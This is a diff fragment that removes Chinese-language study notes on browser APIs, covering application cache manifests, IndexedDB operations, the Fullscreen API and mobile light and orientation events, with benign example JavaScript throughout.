-      * [表示除 CACHE 中指定的文件其他全部]
-      login.asp
-    FALLBACK:      # 此标题下列出的文件规定当页面无法访问时的回退页面,比如 404 页面 
-      # 离线状态下代替文件 
-      /404.html 
-  Example: 
-    // manifest文件中
-    CACHE MANIFEST
-    #version 1.1
-    CACHE:
-      img/1.jpg
-      img/2.jpg
-      css/assets.css
-    NETWORK:
-      *
-    // html中
-    <!DOCTYPE html>
-    <html manifest="./manifest.appcache"> 
-      <head>
-        <meta charset="utf-8">
-        <title>app cache demo</title>
-      </head>
-      <body>
-        <h1>app cache demo</h1>
-        <ul>
-          <li><img src="img/1,jpg" alt=""></li>
-          <li><img src="img/2,jpg" alt=""></li>
-        </ul>
-      </body>
-      <script type="text/javascript">
-      window.addEventListener("load",function(e){
-        window.applicationCache.addEventListener("updateready",function(e){
-          console.log(window.applicationCache.status);
-          if (window.applicationCache.status == window.applicationCache.UPDATEREADY) {
-            window.applicationCache.swapCache();
-            if (confirm('a new version of this site is available,load it?')) {
-              window.location.reload();
-            }
-          }
-          else {
-            console.log('manifest don\'t change');
-          }
-        },false)
-      },false)
-        
-      </script>
-    </html>
-    
-    在服务器添加mime-types text/cache-manifest
-      如在 xampp->apache->conf->mime.types 中
-      添加 text/cache-manifest  appcache
-  applicationCache 核心对象
-    applicationCache.status; 表示应用缓存的状态值
-      0  无缓存,没有与页面相关的应用缓存
-      1  闲置,应用缓存未得到更新
-      2  检查中,正在下载描述文件并检查更新
-      3  下载中,应用缓存正在下载描述文件中指定的资源
-      4  更新完成,应用缓存已经更新了资源,且所有资源都已下载完毕,可通过swapCache()来使用了
-      5  废弃,应用缓存的描述文件已经不存在了,此页面无法再访问应用缓存
-    ◆事件
-    checking  在浏览器为应用缓存查找更新时触发
-    error     在检查更新或下载资源期间发生错误时触发
-    noupdate  在检查描述文件发现文件无变化时触发
-    downloading 在开始下载应用缓存资源时触发
-    progress  在文件下载应用缓存的过程中持续不断的触发
-    updateready 在页面新的应用缓存下载完毕且可以通过swapCache()使用时触发
-    cached    在应用缓存完整可用时触发
-IndexedDB,浏览器端数据库 [HTML5] 
-  PS: IE 10+支持,但是Safari完全不支持[?];
-    能够在客户端持久的储存结构化数据的数据库,并且提供了丰富的查询能力;
-    按域名分配独立空间[如a.qq.com 和 b.qq.com],一个域名下可以创建多个数据库,
-    每个数据库可以创建多个对象储存空间[表],
-    一个对象储存空间可以储存多个对象数据
-  概述 
-    随着浏览器的处理能力不断增强,越来越多的网站开始考虑,将大量数据储存在客户端,
-    这样可以减少用户等待从服务器获取数据的时间。
-    现有的浏览器端数据储存方案,都不适合储存大量数据;
-    cookie不超过4KB,且每次请求都会发送回服务器端;
-    Window.name 属性缺乏安全性,且没有统一的标准;
-    localStorage在 2.5 M 到 10 MB 之间[DiBs];
-    可以被网页脚本程序创建和操作,它允许储存大量数据,提供查找接口,还能建立索引。
-    IndexedDB不属于关系型数据库[不支持SQL查询语句],更接近NoSQL数据库。
-  特点 
-    1、键值对储存 
-      IndexedDB内部采用对象仓库[object store]存放数据。
-      所有类型的数据都可以直接存入,包括JavaScript对象。
-      在对象仓库中,数据以“键值对”的形式保存,
-      每一个数据都有对应的键名,键名是独一无二的,不能有重复,否则会抛出一个错误。
-    2、异步
-      IndexedDB操作时不会锁死浏览器,用户依然可以进行其他操作,
-      这与localStorage形成对比,后者的操作是同步的。
-      异步设计是为了防止大量数据的读写,拖慢网页的表现。
-    3、支持事务。 
-      IndexedDB支持事务[transaction],
-      意味着一系列操作步骤之中,只要有一步失败,整个事务就都取消,
-      数据库回到事务发生之前的状态,不存在只改写一部分数据的情况。
-    4、同域限制 
-      IndexedDB也受到同域限制,每一个数据库对应创建该数据库的域名。
-      来自不同域名的网页,只能访问自身域名下的数据库,而不能访问其他域名下的数据库。
-    5、储存空间大 
-      IndexedDB的储存空间比localStorage大得多,一般来说不少于250MB。
-      IE的储存上限是250MB,Chrome和Opera是剩余空间的某个百分比,Firefox则没有上限。
-    6、支持二进制储存。
-       IndexedDB不仅可以储存字符串,还可以储存二进制数据。
-  检查浏览器是否支持该API及兼容写法 
-    if("indexedDB" in window) {
-      console.log('支持');
-    } 
-    else {
-      console.log('不支持');
-    }
-    兼容写法
-    var indexedDB = window.indexedDB || window.webkitIndexedDB 
-    || window.mozIndexedDB || window.msIndexedDB;
-  var openRequest = indexedDB.open(str[,num]);  打开数据库,不存在则创建
-    str   字符串,数据库名称
-    num   大于 0 的正整数[0 将报错],数据库版本,可选,默认为1
-  打开数据库事件 
-    PS:open方法返回的是一个对象[IDBOpenDBRequest],事件在该对象上触发
-    success 打开成功
-    error   打开失败
-    upgradeneeded 第一次打开该数据库,或者数据库版本发生变化时 
-      第一次打开数据库时,会先触发upgradeneeded事件,然后触发success事件。
-    blocked       上一次的数据库连接还未关闭 
-    event,事件对象
-      event.target.result 指向打开的IndexedDB数据库
-    Example:
-      var openRequest = indexedDB.open("test",1);
-      var db;
-      openRequest.onupgradeneeded = function(e) {
-        console.log("Upgrading...");
-      }
-      openRequest.onsuccess = function(e) {
-        console.log("Success!");
-        db = e.target.result;
-      }
-      openRequest.onerror = function(e) {
-        console.log("Error");
-        console.dir(e);
-      }
-  ◆数据库对象实例的方法、属性
-    PS:获得数据库实例以后,就可以用实例对象的方法操作数据库。
-  db.createObjectStore(str[,obj]); 用于创建存放数据的“对象仓库” 
-    PS:类似于传统关系型数据库的表格;若该对象仓库已经存在,就会抛出一个错误;
-    str 字符串,对象仓库的名称
-    obj 对象,用于设置对象仓库的属性
-      db.createObjectStore("test", { keyPath: "email" }); 
-      db.createObjectStore("test2", { autoIncrement: true });
-      keyPath 表示所存入对象的email属性用作每条记录的键名
-        [由于键名不能重复,所以存入之前必须保证数据的email属性值都是不一样的],默认值为null；
-      autoIncrement 表示是否使用自动递增的整数作为键名[第一个数据为1,第二个数据为2,以此类推]
-        默认为false。 一般来说,keyPath和autoIncrement属性只要使用一个就够了,
-        若两个同时使用,表示键名为递增的整数,且对象不得缺少指定属性。
-  db.objectStoreNames  返回一个DOMStringList对象 
-    里面包含了当前数据库所有“对象仓库”的名称。
-    db.objectStoreNames.contains(str)  检查数据库是否包含某个“对象仓库”
-      if(!db.objectStoreNames.contains("firstOS")) {
-        db.createObjectStore("firstOS");
-      }
-      判断某个“对象仓库”是否存在,若不存在就创建该对象仓库。
-  ◆数据库事务对象
-  var dbt = db.transaction(arr,option);  返回一个事务对象 
-    PS:向数据库添加数据之前,必须先创建数据库事务。
-    arr     数组,里面是所涉及的对象仓库,通常是只有一个
-    option  字符串,表示操作类型,目前,操作类型只有两种
-      添加数据使用readwrite,读取数据使用readonly。
-      readonly  只读
-      readwrite 读写
-  var store = dbt.objectStore("firstOS");  用于获取指定的对象仓库
-  事务对象的三个事件,可以用来定义回调函数
-    abort    事务中断
-    complete 事务完成
-    error    事务出错
-    var dbt = db.transaction(["note"], "readonly");  
-    dbt.oncomplete = function(event) {
-      // some code
-    };
-  ◆事务对象的方法,用于操作数据。
-  var request = store.add(o,1); 添加数据
-    获取对象仓库以后,就可以用add方法往里面添加数据了。
-    var store = dbt.objectStore("firstOS");
-    var o = {p: 123};
-    var request = store.add(o,1);
-    add方法的第一个参数是所要添加的数据,
-    第二个参数是这条数据对应的键名(key),上面代码将对象o的键名设为1。
-    若在创建数据仓库时,对键名做了设置,这里也可以不指定键名。
-    success和error事件
-      add方法是异步的,有自己的success和error事件
-      var request = store.add(o,1);
-      request.onerror = function(e) {
-        // error handler
-        console.log("Error",e.target.error.name); 
-      }
-      request.onsuccess = function(e) {
-        console.log("数据添加成功！");
-      }
-  var ob = store.get(x); 读取数据
-    参数是数据的键名
-    var t = db.transaction(["test"], "readonly");
-    var store = dbt.objectStore("test");
-    var ob = store.get(x);
-    get方法也是异步的,会触发自己的success和error事件,可以对它们指定回调函数。
-      var ob = store.get(x);
-      ob.onsuccess = function(e) {
-        // ...
-      }
-  从创建事务到读取数据,所有操作方法也可以写成下面这样链式形式。
-    db.transaction(["test"], "readonly")
-    .objectStore("test")
-    .get(X)
-    .onsuccess = function(e){}
-  var request = store.put(o, 1); 更新记录
-    put方法的用法与add方法相近。
-    var o = { p:456 };
-    var request = store.put(o, 1);
-  var request = store.delete(thisId); 删除记录
-    var t = db.transaction(["people"], "readwrite");
-    var request = dbt.objectStore("people").delete(thisId);
-    delete方法的参数是数据的键名。另外,delete也是一个异步操作,可以为它指定回调函数。
-  var cursor = store.openCursor(); 遍历数据
-    若想要遍历数据,就要openCursor方法,它在当前对象仓库里面建立一个读取光标(cursor)。
-    var t = db.transaction(["test"], "readonly");
-    var store = dbt.objectStore("test");
-    var cursor = store.openCursor();
-    openCursor方法也是异步的,有自己的success和error事件,可以对它们指定回调函数。
-      cursor.onsuccess = function(e) {
-        var res = e.target.result;
-        if(res) {
-          console.log("Key", res.key);
-          console.dir("Data", res.value);
-          res.continue();
-        }
-      }
-      回调函数接受一个事件对象作为参数,该对象的 target.result 属性指向当前数据对象。
-      当前数据对象的 key 和 value 分别返回键名和键值[即实际存入的数据]。
-      continue 方法将光标移到下一个数据对象,
-      若当前数据对象已经是最后一个数据了,则光标指向null。
-    openCursor方法还可以接受第二个参数,表示遍历方向,默认值为next,
-      其他可能的值为prev、nextunique和prevunique。
-      后两个值表示若遇到重复值,会自动跳过。
-  store.createIndex 用于创建索引
-    假定对象仓库中的数据对象都是下面person类型的。
-    var person = {
-      name:name,
-      email:email,
-      created:new Date()
-    }
-    可以指定这个数据对象的某个属性来建立索引。
-    var store = db.createObjectStore("people", { autoIncrement:true });
-    store.createIndex("name","name", {unique:false});
-    store.createIndex("email","email", {unique:true});
-    createIndex方法接受三个参数,
-    第一个是索引名称,
-    第二个是建立索引的属性名,
-    第三个是参数对象,用来设置索引特性。
-    unique表示索引所在的属性是否有唯一值,上面代码表示name属性不是唯一值,email属性是唯一值。
-  var request = index.get(name); 从对象仓库返回指定的索引
-    有了索引以后,就可以针对索引所在的属性读取数据。
-    var t = db.transaction(["people"],"readonly");
-    var store = dbt.objectStore("people");
-    var index = store.index("name");
-    var request = index.get(name);
-    上面代码打开对象仓库以后,先用index方法指定索引在name属性上面,
-    然后用get方法读取某个name属性所在的数据。
-    若没有指定索引的那一行代码,get方法只能按照键名读取数据,
-    而不能按照name属性读取数据。
-    需要注意的是,这时get方法有可能取回多个数据对象,因为name属性没有唯一值。
-    另外,get是异步方法,读取成功以后,只能在success事件的回调函数中处理数据。
-  IDBKeyRange对象
-    索引的有用之处,还在于可以指定读取数据的范围。
-    这需要用到浏览器原生的IDBKeyRange对象。
-    IDBKeyRange对象的作用是生成一个表示范围的Range对象。生成方法有四种:
-    lowerBound方法:指定范围的下限。
-    upperBound方法:指定范围的上限。
-    bound方法:指定范围的上下限。
-    only方法:指定范围中只有一个值。
-    下面是一些代码实例:
-    // All keys ≤ x  
-    var r1 = IDBKeyRange.upperBound(x);
-    
-    // All keys < x  
-    var r2 = IDBKeyRange.upperBound(x, true);
-    
-    // All keys ≥ y  
-    var r3 = IDBKeyRange.lowerBound(y);
-    
-    // All keys > y  
-    var r4 = IDBKeyRange.lowerBound(y, true);
-    
-    // All keys ≥ x && ≤ y  
-    var r5 = IDBKeyRange.bound(x, y);
-    
-    // All keys > x &&< y  
-    var r6 = IDBKeyRange.bound(x, y, true, true);
-    
-    // All keys > x && ≤ y  
-    var r7 = IDBKeyRange.bound(x, y, true, false);
-    
-    // All keys ≥ x &&< y  
-    var r8 = IDBKeyRange.bound(x, y, false, true);
-    
-    // The key = z  
-    var r9 = IDBKeyRange.only(z);
-    前三个方法(lowerBound、upperBound和bound)默认包括端点值,可以传入一个布尔值,修改这个属性。
-    
-    生成Range对象以后,将它作为参数输入openCursor方法,就可以在所设定的范围内读取数据。
-    var t = db.transaction(["people"],"readonly");
-    var store = dbt.objectStore("people");
-    var index = store.index("name");
-    
-    var range = IDBKeyRange.bound('B', 'D');
-    
-    index.openCursor(range).onsuccess = function(e) {
-      var cursor = e.target.result;
-      if(cursor) {
-        console.log(cursor.key + ":");
-        for(var field in cursor.value) {
-          console.log(cursor.value[field]);
-        }
-        cursor.continue();
-      }
-    }  
-  Example:
-Fullscreen,全屏操作[HTML5] 
-  PS: 全屏API可以控制浏览器的全屏显示,让一个Element节点[以及子节点]占满用户的整个屏幕
-    目前各大浏览器的最新版本都支持这个API[包括IE11],但是使用的时候需要加上浏览器前缀
-    放大一个节点时,Firefox和Chrome在行为上略有不同。
-    Firefox自动为该节点增加一条CSS规则,将该元素放大至全屏状态,width:100%; height:100%,
-    而Chrome则是将该节点放在屏幕的中央,保持原来大小,其他部分变黑。
-    用户手动按下ESC键或F11键,也可以退出全屏键;
-    加载新页面,或切换tab,或从浏览器转向其他应用[按下Alt-Tab],也会导致退出全屏状态;
-  elem.requestFullscreen() 使该节点全屏
-    PS:在Chrome/Firefox等浏览器中直接使用直接使元素节点全屏,会被拒绝
-    function requestFullscreen(element) {
-      if(element.requestFullscreen) {
-        element.requestFullscreen();
-      } 
-      else if(element.mozRequestFullScreen) {
-        element.mozRequestFullScreen();
-      } 
-      else if(element.msRequestFullscreen){
-        element.msRequestFullscreen();
-      } 
-      else if(element.webkitRequestFullscreen) {
-        element.webkitRequestFullScreen();
-      }
-      else {
-        alert('该浏览器不支持全屏');
-      }
-    }
-    requestFullscreen(document.documentElement);
-    requestFullscreen(document.getElementById("videoElement"));
-    为了让Chrome的行为与Firefox保持一致,可以自定义一条CSS规则。
-      :-webkit-full-screen #myvideo {
-        width: 100%;
-        height: 100%;
-      }
-  document.exitFullscreen()  用于取消全屏[该方法也带有浏览器前缀]
-    function exitFullscreen() {
-      if (document.exitFullscreen) {
-        document.exitFullscreen();
-      } 
-      else if (document.msExitFullscreen) {
-        document.msExitFullscreen();
-      } 
-      else if (document.mozCancelFullScreen) {
-        document.mozCancelFullScreen();
-      } 
-      else if (document.webkitExitFullscreen) {
-        document.webkitExitFullscreen();
-      }
-    }
-    exitFullscreen();
-  document.fullscreenElement 返回正处于全屏状态的Element节点,
-    PS:若当前没有节点处于全屏状态,则返回null。
-    var fullscreenElement = document.fullscreenElement 
-    || document.mozFullScreenElement 
-    || document.webkitFullscreenElement;
-  document.fullscreenEnabled 表示当前文档是否可以切换到全屏状态的布尔值
-    var fullscreenEnabled = document.fullscreenEnabled 
-    || document.mozFullScreenEnabled 
-    || document.webkitFullscreenEnabled 
-    || document.msFullscreenEnabled;
-  fullscreenchange  浏览器进入或离开全屏时在document上触发事件
-    document.addEventListener("fullscreenchange", function( event ) {
-      if (document.fullscreenElement) {
-        console.log('进入全屏');
-      } 
-      else {
-        console.log('退出全屏');
-      }
-    });
-  fullscreenerror   浏览器无法进入全屏时触发事件,可能是技术原因,也可能是用户拒绝
-  全屏状态的CSS 
-    全屏状态下,大多数浏览器的CSS支持:full-screen伪类,只有IE11支持:fullscreen伪类。
-    使用这个伪类,可以对全屏状态设置单独的CSS属性。
-    :-webkit-full-screen {
-      /* properties */
-    }
-    :-moz-full-screen {
-      /* properties */
-    }
+      console.log("出错了！");
+      // 2014-05-18T09:00.000Z 出错了！
 
-    :-ms-fullscreen {
-      /* properties */
-    }
-
-    :full-screen { /*pre-spec */
-      /* properties */
-    }
-
-    :fullscreen { /* spec */
-      /* properties */
-    }
-    /* deeper elements */
-    :-webkit-full-screen video {
-      width: 100%;
-      height: 100%;
-    }
---------------------------------------------------------------------------------
-移动端 
-devicelight    设备屏幕亮度变化事件 [HTML5] 
-  PS:移动设备的亮度传感器感知外部亮度发生显著变化时触发;目前,只有Firefox部署了该API
-  var DLRun = function(event) { }
-  window.addEventListener('devicelight',DLRun);
-  event.value  亮度的流明值
-  Example:  若亮度变强,网页显示黑底白字,若亮度变弱,网页显示白底黑字
-    window.addEventListener('devicelight', function(e) {
-      var lux = e.value;
-      if(lux < 50) {
-        document.body.className = 'dim';
-      }
-      if(lux >= 50 && lux <= 1000) {
-        document.body.className = 'normal';
-      }
-      if(lux > 1000)  {
-        document.body.className = 'bright';
-      } 
-    });
-    CSS下一个版本的Media Query可以单独设置亮度,一旦浏览器支持,就可以用来取代Luminosity API.
-    @media (light-level: dim) { /* 暗光环境 */ }
-    @media (light-level: normal) { /* 正常光环境 */ }
-    @media (light-level: washed) { /* 明亮环境 */ }
-deviceorientation  设备摆放方向[竖放或横放]变化事件[HTML5] 
-  PS:一旦设备的方向发生变化触发
-  检测浏览器是否支持该API
-    if (window.DeviceOrientationEvent) { /*  支持 */ } 
-    else { /* 不支持 */ }
-  window.addEventListener("deviceorientation", DORun);
-  function DORun(event){ }
-  event 
-    PS:分别对应手机摆放的三维倾角变化.要理解它们,就要理解手机的方向模型.
-      当手机水平摆放时,使用三个轴标示它的空间位置:x轴代表横轴、y轴代表竖轴、z轴代表垂直轴.
-      event对象的三个属性就对应这三根轴的旋转角度.
-    event.alpha  表示围绕z轴的旋转,从0到360度.      设备水平摆放时,alpha为0
-    event.beta   表示围绕x轴的旋转,从-180 度到180度 设备水平摆放时,beta为0
-    event.gamma 表示围绕y轴的选择,从-90 到90度      设备水平摆放时,gramma为0
-orientationchange  在屏幕发生翻转时触发[HTML5] 
-  window.orientation 设备的方向,0 表示竖直;90 表示右旋;-90 表示 左旋;
